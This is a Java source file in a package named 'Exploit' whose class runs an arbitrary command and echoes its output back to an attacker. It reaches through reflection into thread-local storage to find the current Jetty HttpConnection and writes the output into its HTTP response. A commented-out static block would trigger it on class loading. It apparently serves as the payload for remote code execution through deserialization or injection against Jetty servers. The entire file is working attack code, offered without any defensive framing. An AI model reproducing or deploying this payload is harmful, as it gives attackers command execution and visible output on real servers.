package Exploit;

import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.*;

import java.lang.reflect.Field;

public class Test234 {
 /*   static{
        try{
            Test234.test();
        }
        catch (Exception e)
        {
            System.out.println(e);
        }
    }
*/
    public static void test(String cmd) throws Exception{

        Process process = Runtime.getRuntime().exec(cmd);
        process.waitFor();
        InputStream is = process.getInputStream();
        byte[] result = new byte[is.available()];
        is.read(result, 0, is.available());
        String resultStr = new String(result);

            Thread thread = Thread.currentThread();

            Field field = Integer.class.forName("java.lang.Thread").getDeclaredField("threadLocals");
            field.setAccessible(true);
            Object threadLocals = field.get(thread);

            Class<?> threadLocalMap = Integer.class.forName("java.lang.ThreadLocal$ThreadLocalMap");

            Field tableField = threadLocalMap.getDeclaredField("table");
            tableField.setAccessible(true);
            Object table = tableField.get(threadLocals);

            Class<?> entry = Integer.class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry");
            Field valueField = entry.getDeclaredField("value");
            valueField.setAccessible(true);

            Object httpConnection = null;

            for (int i = 0; i < java.lang.reflect.Array.getLength(table); i++)
            {
                Object obj = java.lang.reflect.Array.get(table, i);
                if (obj == null)
                    continue;

                httpConnection = valueField.get(obj);
                if (httpConnection == null)
                    continue;

                if (httpConnection.getClass().getName().equals("org.eclipse.jetty.server.HttpConnection"))
                    break;
            }

            Class<?> HttpConnection = httpConnection.getClass();
            Object channel = HttpConnection.getMethod("getHttpChannel").invoke(httpConnection);
            Class<?> HttpChannel = channel.getClass();
            Object response = HttpChannel.getMethod("getResponse").invoke(channel);
            Class<?> Response = response.getClass();
            PrintWriter writer = (PrintWriter) Response.getMethod("getWriter").invoke(response);

            writer.write(resultStr);
            writer.close();

            //HttpConnection.getCurrentConnection().getHttpChannel().getResponse().getWriter().write("test2333333");
        
    }
}


